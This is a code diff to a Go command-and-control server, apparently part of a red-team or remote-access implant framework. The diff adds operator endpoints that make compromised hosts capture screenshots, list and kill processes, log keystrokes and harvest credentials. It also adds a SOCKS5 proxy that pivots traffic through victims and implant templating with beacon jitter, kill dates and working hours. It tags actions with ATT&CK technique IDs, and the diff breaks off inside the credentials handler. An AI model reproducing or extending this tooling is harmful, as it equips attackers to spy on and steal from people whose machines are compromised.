@@ -3,11 +3,14 @@ package main
 import (
 	"bufio"
 	"crypto/rand"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"io"
 	"log"
+	"net"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -46,6 +49,17 @@ const defaultSessionLogFile = "c2_sessions.jsonl"
 var sessionLogFile = defaultSessionLogFile
 var sessionLogMutex sync.Mutex
 
+type socksConnEntry struct {
+	socksConn net.Conn
+	sessionID string
+	client    *common.Client
+}
+var socksConns = make(map[string]*socksConnEntry)
+var socksConnsMu sync.Mutex
+
+var sessionPlatform = make(map[string]string)
+var sessionPlatformMu sync.Mutex
+
 func main() {
 	config := LoadConfig()
 	if err := config.Save(); err != nil {
@@ -68,7 +82,14 @@ func main() {
 	http.HandleFunc("/op/upload", corsOp(handleOpUpload))
 	http.HandleFunc("/op/download", corsOp(handleOpDownload))
 	http.HandleFunc("/op/listdir", corsOp(handleOpListDir))
+	http.HandleFunc("/op/screenshot", corsOp(handleOpScreenshot))
+	http.HandleFunc("/op/processlist", corsOp(handleOpProcessList))
+	http.HandleFunc("/op/prockill", corsOp(handleOpProcessKill))
+	http.HandleFunc("/op/keylog/start", corsOp(handleOpKeylogStart))
+	http.HandleFunc("/op/keylog/stop", corsOp(handleOpKeylogStop))
+	http.HandleFunc("/op/creds", corsOp(handleOpCreds))
 	http.HandleFunc("/op/sessions/history", corsOp(handleOpSessionsHistory))
+	http.HandleFunc("/op/audit", corsOp(handleOpAudit))
 
 	if f, err := os.OpenFile("c2_audit.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644); err == nil {
 		auditLog = log.New(f, "", log.LstdFlags)
@@ -81,6 +102,38 @@ func main() {
 		go runOperator()
 	} else {
 		log.Printf("No TTY for stdin; operator REPL disabled. Use HTTP API: GET /op/sessions, POST /op/exec, POST /op/kill")
+	}
+
+	if config.SocksPort > 0 {
+		go runSocksServer(config.SocksPort)
+	}
+
+	if len(config.Listeners) > 0 {
+		var wg sync.WaitGroup
+		for i := range config.Listeners {
+			lis := &config.Listeners[i]
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+				addr := fmt.Sprintf(":%d", lis.Port)
+				srv := &http.Server{Addr: addr}
+				if lis.TLS {
+					tc, err := tls.LoadX509KeyPair(lis.CertFile, lis.KeyFile)
+					if err != nil {
+						log.Printf("Listener %s TLS error: %v", addr, err)
+						return
+					}
+					srv.TLSConfig = &tls.Config{Certificates: []tls.Certificate{tc}, MinVersion: tls.VersionTLS12}
+					log.Printf("Listening TLS on %s", addr)
+					log.Fatal(srv.ListenAndServeTLS("", ""))
+				} else {
+					log.Printf("Listening (no TLS) on %s", addr)
+					log.Fatal(srv.ListenAndServe())
+				}
+			}()
+		}
+		wg.Wait()
+		return
 	}
 
 	server := &http.Server{
@@ -218,6 +271,7 @@ func handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	var auth struct {
 		ClientID     string `json:"client_id"`
 		ClientSecret string `json:"client_secret"`
+		Platform     string `json:"platform"`
 	}
 	if err := json.Unmarshal(message, &auth); err != nil {
 		log.Printf("Error parsing auth message: %v", err)
@@ -242,14 +296,21 @@ func handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	clients[sessionID] = client
 	clientsMutex.Unlock()
 
+	sessionPlatformMu.Lock()
+	sessionPlatform[sessionID] = auth.Platform
+	sessionPlatformMu.Unlock()
+
 	addrStr := conn.RemoteAddr().String()
-	appendSessionEvent("joined", sessionID, addrStr)
+	appendSessionEventWithPlatform("joined", sessionID, addrStr, auth.Platform)
 
 	defer func() {
 		appendSessionEvent("left", sessionID, "")
 		clientsMutex.Lock()
 		delete(clients, sessionID)
 		clientsMutex.Unlock()
+		sessionPlatformMu.Lock()
+		delete(sessionPlatform, sessionID)
+		sessionPlatformMu.Unlock()
 	}()
 
 	log.Printf("session %s connected", sessionID)
@@ -260,7 +321,24 @@ func handleWebSocket(w http.ResponseWriter, r *http.Request) {
 			log.Printf("Session %s closed: %v", sessionID, err)
 			return
 		}
-
+		var raw map[string]interface{}
+		if err := json.Unmarshal(message, &raw); err != nil {
+			continue
+		}
+		if _, ok := raw["socks_data"]; ok {
+			if cid, _ := raw["conn_id"].(string); cid != "" {
+				if data, _ := raw["data"].(string); data != "" {
+					dec, _ := base64.StdEncoding.DecodeString(data)
+					socksConnsMu.Lock()
+					ent := socksConns[cid]
+					socksConnsMu.Unlock()
+					if ent != nil && ent.socksConn != nil {
+						ent.socksConn.Write(dec)
+					}
+				}
+			}
+			continue
+		}
 		var resp common.Response
 		if err := json.Unmarshal(message, &resp); err != nil {
 			continue
@@ -281,6 +359,108 @@ func handleWebSocket(w http.ResponseWriter, r *http.Request) {
 		} else {
 			pendingMutex.Unlock()
 		}
+	}
+}
+
+func runSocksServer(port int) {
+	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
+	if err != nil {
+		log.Printf("SOCKS listen error: %v", err)
+		return
+	}
+	log.Printf("SOCKS5 proxy listening on port %d", port)
+	for {
+		conn, err := ln.Accept()
+		if err != nil {
+			continue
+		}
+		go handleSocksConn(conn)
+	}
+}
+
+func handleSocksConn(socksConn net.Conn) {
+	defer socksConn.Close()
+	buf := make([]byte, 256)
+	n, err := io.ReadAtLeast(socksConn, buf, 3)
+	if err != nil || n < 3 || buf[0] != 0x05 || buf[1] != 0x01 {
+		return
+	}
+	if _, err := socksConn.Write([]byte{0x05, 0x00}); err != nil {
+		return
+	}
+	n, err = io.ReadAtLeast(socksConn, buf, 4)
+	if err != nil || n < 4 || buf[0] != 0x05 || buf[1] != 0x01 {
+		return
+	}
+	var target string
+	switch buf[3] {
+	case 0x01:
+		if _, err := io.ReadFull(socksConn, buf[4:10]); err != nil {
+			return
+		}
+		target = fmt.Sprintf("%d.%d.%d.%d:%d", buf[4], buf[5], buf[6], buf[7], int(buf[8])<<8|int(buf[9]))
+	case 0x03:
+		if _, err := io.ReadFull(socksConn, buf[4:5]); err != nil {
+			return
+		}
+		alen := int(buf[4])
+		if _, err := io.ReadFull(socksConn, buf[5:5+alen+2]); err != nil {
+			return
+		}
+		target = string(buf[5:5+alen]) + fmt.Sprintf(":%d", int(buf[5+alen])<<8|int(buf[5+alen+1]))
+	default:
+		return
+	}
+	connID := shortSessionID()
+	clientsMutex.Lock()
+	var sessionID string
+	for id := range clients {
+		sessionID = id
+		break
+	}
+	clientsMutex.Unlock()
+	if sessionID == "" {
+		socksConn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
+		return
+	}
+	ev, ok := opSendAndWait(sessionID, common.Command{
+		Type: common.CmdSocksConnect,
+		Args: map[string]string{"conn_id": connID, "target_addr": target},
+	})
+	if !ok || ev.Response.Status != "success" {
+		socksConn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
+		return
+	}
+	socksConn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
+	clientsMutex.Lock()
+	c, ok := clients[sessionID]
+	clientsMutex.Unlock()
+	if !ok {
+		return
+	}
+	entry := &socksConnEntry{socksConn: socksConn, sessionID: sessionID, client: c}
+	socksConnsMu.Lock()
+	socksConns[connID] = entry
+	socksConnsMu.Unlock()
+	defer func() {
+		socksConnsMu.Lock()
+		delete(socksConns, connID)
+		socksConnsMu.Unlock()
+	}()
+	for {
+		buf := make([]byte, 32*1024)
+		n, err := socksConn.Read(buf)
+		if err != nil {
+			return
+		}
+		if n == 0 {
+			continue
+		}
+		data := base64.StdEncoding.EncodeToString(buf[:n])
+		cmd := common.Command{Type: common.CmdSocksData, ID: shortSessionID(), Args: map[string]string{"conn_id": connID, "data": data}}
+		c.Mu.Lock()
+		_ = c.Conn.WriteJSON(cmd)
+		c.Mu.Unlock()
 	}
 }
 
@@ -311,10 +491,27 @@ func handleSync(w http.ResponseWriter, r *http.Request) {
 		scheme = "http"
 	}
 	serverURL := fmt.Sprintf("%s://%s", scheme, host)
+	q := r.URL.Query()
+	interval := q.Get("interval")
+	if interval == "" {
+		interval = "30"
+	}
+	jitter := q.Get("jitter")
+	if jitter == "" {
+		jitter = "0"
+	}
+	killDate := q.Get("kill_date")
+	workingStart := q.Get("working_hours_start")
+	workingEnd := q.Get("working_hours_end")
 	script := string(tpl)
 	script = strings.ReplaceAll(script, "SERVER_URL", serverURL)
 	script = strings.ReplaceAll(script, "CLIENT_ID", config.ClientID)
 	script = strings.ReplaceAll(script, "CLIENT_SECRET", config.ClientSecret)
+	script = strings.ReplaceAll(script, "CALLBACK_INTERVAL", interval)
+	script = strings.ReplaceAll(script, "JITTER_PERCENT", jitter)
+	script = strings.ReplaceAll(script, "KILL_DATE", killDate)
+	script = strings.ReplaceAll(script, "WORKING_HOURS_START", workingStart)
+	script = strings.ReplaceAll(script, "WORKING_HOURS_END", workingEnd)
 	encoded := base64.StdEncoding.EncodeToString([]byte(script))
 	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
 	w.Write([]byte(encoded))
@@ -324,7 +521,7 @@ func corsOp(h http.HandlerFunc) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Access-Control-Allow-Origin", "*")
 		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
-		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Op-Token")
+		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Op-Token, X-Op-Identity")
 		if r.Method == http.MethodOptions {
 			w.WriteHeader(http.StatusNoContent)
 			return
@@ -341,7 +538,58 @@ func checkOpToken(r *http.Request) bool {
 	return r.Header.Get("X-Op-Token") == config.OpToken || r.URL.Query().Get("k") == config.OpToken
 }
 
+func getOperatorID(r *http.Request) string {
+	if id := r.Header.Get("X-Op-Identity"); id != "" {
+		return id
+	}
+	if id := LoadConfig().OpIdentity; id != "" {
+		return id
+	}
+	return "unknown"
+}
+
+const auditJSONLFile = "c2_audit.jsonl"
+var auditJSONLMutex sync.Mutex
+
+var actionToTechnique = map[string]string{
+	"exec":         "T1059.003",
+	"kill":         "",
+	"upload":       "T1537",
+	"download":     "T1530",
+	"screenshot":   "T1113",
+	"processlist":  "T1057",
+	"prockill":     "T1562",
+	"keylog_start": "T1056.001",
+	"keylog_stop":  "T1056.001",
+}
+
+func appendAuditJSONL(r *http.Request, action, sessionID, detail string) {
+	auditJSONLMutex.Lock()
+	defer auditJSONLMutex.Unlock()
+	f, err := os.OpenFile(auditJSONLFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
+	if err != nil {
+		log.Printf("audit jsonl write error: %v", err)
+		return
+	}
+	defer f.Close()
+	techniqueID := actionToTechnique[action]
+	line, _ := json.Marshal(map[string]string{
+		"ts":           time.Now().UTC().Format(time.RFC3339),
+		"operator_id":  getOperatorID(r),
+		"action":       action,
+		"session_id":   sessionID,
+		"detail":       detail,
+		"technique_id": techniqueID,
+	})
+	line = append(line, '\n')
+	f.Write(line)
+}
+
 func appendSessionEvent(event, id, addr string) {
+	appendSessionEventWithPlatform(event, id, addr, "")
+}
+
+func appendSessionEventWithPlatform(event, id, addr, platform string) {
 	sessionLogMutex.Lock()
 	defer sessionLogMutex.Unlock()
 	f, err := os.OpenFile(sessionLogFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
@@ -353,7 +601,11 @@ func appendSessionEvent(event, id, addr string) {
 	at := time.Now().UTC().Format(time.RFC3339)
 	var line []byte
 	if event == "joined" {
-		line, _ = json.Marshal(map[string]string{"event": "joined", "id": id, "addr": addr, "at": at})
+		m := map[string]string{"event": "joined", "id": id, "addr": addr, "at": at}
+		if platform != "" {
+			m["platform"] = platform
+		}
+		line, _ = json.Marshal(m)
 	} else {
 		line, _ = json.Marshal(map[string]string{"event": "left", "id": id, "at": at})
 	}
@@ -373,20 +625,96 @@ func handleOpSessions(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	type sessionInfo struct {
-		ID   string `json:"id"`
-		Addr string `json:"addr"`
+		ID       string `json:"id"`
+		Addr     string `json:"addr"`
+		Platform string `json:"platform,omitempty"`
 	}
 	var list []sessionInfo
 	clientsMutex.Lock()
+	sessionPlatformMu.Lock()
 	for id, c := range clients {
-		list = append(list, sessionInfo{ID: id, Addr: c.Conn.RemoteAddr().String()})
+		plat := sessionPlatform[id]
+		list = append(list, sessionInfo{ID: id, Addr: c.Conn.RemoteAddr().String(), Platform: plat})
 	}
+	sessionPlatformMu.Unlock()
 	clientsMutex.Unlock()
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(list)
 }
 
 const sessionHistoryLimit = 100
+
+func handleOpAudit(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	limit := 100
+	if s := r.URL.Query().Get("limit"); s != "" {
+		if n, err := fmt.Sscanf(s, "%d", &limit); err == nil && n == 1 && limit > 0 {
+			if limit > 500 {
+				limit = 500
+			}
+		}
+	}
+	format := r.URL.Query().Get("format")
+	f, err := os.Open(auditJSONLFile)
+	if err != nil {
+		if os.IsNotExist(err) {
+			w.Header().Set("Content-Type", "application/json")
+			json.NewEncoder(w).Encode([]interface{}{})
+			return
+		}
+		http.Error(w, "failed to read audit", http.StatusInternalServerError)
+		return
+	}
+	defer f.Close()
+	var lines []string
+	scanner := bufio.NewScanner(f)
+	for scanner.Scan() {
+		lines = append(lines, scanner.Text())
+	}
+	if err := scanner.Err(); err != nil {
+		http.Error(w, "failed to read audit", http.StatusInternalServerError)
+		return
+	}
+	// newest first: take last limit, reverse
+	start := 0
+	if len(lines) > limit {
+		start = len(lines) - limit
+	}
+	var out []map[string]string
+	for i := len(lines) - 1; i >= start; i-- {
+		var m map[string]string
+		if json.Unmarshal([]byte(lines[i]), &m) == nil {
+			out = append(out, m)
+		}
+	}
+	if format == "csv" {
+		w.Header().Set("Content-Type", "text/csv")
+		w.Header().Set("Content-Disposition", "attachment; filename=audit.csv")
+		w.Write([]byte("ts,operator_id,action,session_id,technique_id,detail\n"))
+		for _, m := range out {
+			ts := m["ts"]
+			op := m["operator_id"]
+			action := m["action"]
+			sid := m["session_id"]
+			tid := m["technique_id"]
+			detail := m["detail"]
+			if strings.Contains(detail, ",") || strings.Contains(detail, "\"") {
+				detail = "\"" + strings.ReplaceAll(detail, "\"", "\"\"") + "\""
+			}
+			w.Write([]byte(fmt.Sprintf("%s,%s,%s,%s,%s,%s\n", ts, op, action, sid, tid, detail)))
+		}
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(out)
+}
 
 func handleOpSessionsHistory(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodGet {
@@ -410,14 +738,16 @@ func handleOpSessionsHistory(w http.ResponseWriter, r *http.Request) {
 	defer f.Close()
 
 	type logEvent struct {
-		Event string `json:"event"`
-		ID    string `json:"id"`
-		Addr  string `json:"addr"`
-		At    string `json:"at"`
+		Event    string `json:"event"`
+		ID       string `json:"id"`
+		Addr     string `json:"addr"`
+		At       string `json:"at"`
+		Platform string `json:"platform"`
 	}
 	type sessionRecord struct {
 		ID        string `json:"id"`
 		Addr      string `json:"addr"`
+		Platform  string `json:"platform,omitempty"`
 		FirstSeen string `json:"first_seen"`
 		LastSeen  string `json:"last_seen"`
 	}
@@ -435,6 +765,9 @@ func handleOpSessionsHistory(w http.ResponseWriter, r *http.Request) {
 		}
 		if e.Event == "joined" {
 			rec.Addr = e.Addr
+			if e.Platform != "" {
+				rec.Platform = e.Platform
+			}
 			if rec.FirstSeen == "" {
 				rec.FirstSeen = e.At
 			}
@@ -511,6 +844,7 @@ func handleOpExec(w http.ResponseWriter, r *http.Request) {
 	}
 	select {
 	case ev := <-ch:
+		appendAuditJSONL(r, "exec", ev.SessionID, req.Command)
 		w.Header().Set("Content-Type", "application/json")
 		json.NewEncoder(w).Encode(map[string]string{
 			"session_id": ev.SessionID,
@@ -575,6 +909,7 @@ func handleOpKill(w http.ResponseWriter, r *http.Request) {
 	if auditLog != nil {
 		auditLog.Printf("kill session=%s", req.SessionID)
 	}
+	appendAuditJSONL(r, "kill", req.SessionID, "")
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(map[string]string{"status": "ok", "session_id": req.SessionID})
 }
@@ -638,6 +973,7 @@ func handleOpUpload(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
 		return
 	}
+	appendAuditJSONL(r, "upload", ev.SessionID, req.Path)
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(map[string]string{
 		"session_id": ev.SessionID, "status": ev.Response.Status,
@@ -670,6 +1006,7 @@ func handleOpDownload(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
 		return
 	}
+	appendAuditJSONL(r, "download", ev.SessionID, req.Path)
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(map[string]string{
 		"session_id": ev.SessionID, "status": ev.Response.Status,
@@ -702,6 +1039,183 @@ func handleOpListDir(w http.ResponseWriter, r *http.Request) {
 		Type: common.CmdListDir,
 		Args: map[string]string{"path": path},
 	})
+	if !ok {
+		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{
+		"session_id": ev.SessionID, "status": ev.Response.Status,
+		"output": ev.Response.Output, "error": ev.Response.Error,
+	})
+}
+
+func handleOpScreenshot(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	var req struct {
+		SessionID string `json:"session_id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
+		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
+		return
+	}
+	ev, ok := opSendAndWait(req.SessionID, common.Command{Type: common.CmdScreenshot, Args: map[string]string{}})
+	if !ok {
+		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
+		return
+	}
+	appendAuditJSONL(r, "screenshot", ev.SessionID, "")
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{
+		"session_id": ev.SessionID, "status": ev.Response.Status,
+		"output": ev.Response.Output, "error": ev.Response.Error,
+	})
+}
+
+func handleOpProcessList(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	var req struct {
+		SessionID string `json:"session_id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
+		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
+		return
+	}
+	ev, ok := opSendAndWait(req.SessionID, common.Command{Type: common.CmdProcessList, Args: map[string]string{}})
+	if !ok {
+		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
+		return
+	}
+	appendAuditJSONL(r, "processlist", ev.SessionID, "")
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{
+		"session_id": ev.SessionID, "status": ev.Response.Status,
+		"output": ev.Response.Output, "error": ev.Response.Error,
+	})
+}
+
+func handleOpProcessKill(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	var req struct {
+		SessionID string `json:"session_id"`
+		PID       string `json:"pid"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" || req.PID == "" {
+		http.Error(w, "bad request: need session_id and pid", http.StatusBadRequest)
+		return
+	}
+	ev, ok := opSendAndWait(req.SessionID, common.Command{
+		Type: common.CmdProcessKill,
+		Args: map[string]string{"pid": req.PID},
+	})
+	if !ok {
+		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
+		return
+	}
+	appendAuditJSONL(r, "prockill", ev.SessionID, req.PID)
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{
+		"session_id": ev.SessionID, "status": ev.Response.Status,
+		"output": ev.Response.Output, "error": ev.Response.Error,
+	})
+}
+
+func handleOpKeylogStart(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	var req struct {
+		SessionID string `json:"session_id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
+		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
+		return
+	}
+	ev, ok := opSendAndWait(req.SessionID, common.Command{Type: common.CmdKeylogStart, Args: map[string]string{}})
+	if !ok {
+		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
+		return
+	}
+	appendAuditJSONL(r, "keylog_start", ev.SessionID, "")
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{
+		"session_id": ev.SessionID, "status": ev.Response.Status,
+		"output": ev.Response.Output, "error": ev.Response.Error,
+	})
+}
+
+func handleOpKeylogStop(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	var req struct {
+		SessionID string `json:"session_id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
+		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
+		return
+	}
+	ev, ok := opSendAndWait(req.SessionID, common.Command{Type: common.CmdKeylogStop, Args: map[string]string{}})
+	if !ok {
+		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
+		return
+	}
+	appendAuditJSONL(r, "keylog_stop", ev.SessionID, "")
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{
+		"session_id": ev.SessionID, "status": ev.Response.Status,
+		"output": ev.Response.Output, "error": ev.Response.Error,
+	})
+}
+
+func handleOpCreds(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	var req struct {
+		SessionID string `json:"session_id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
+		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
+		return
+	}
+	ev, ok := opSendAndWait(req.SessionID, common.Command{Type: common.CmdCreds, Args: map[string]string{}})
 	if !ok {
 		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
 		return
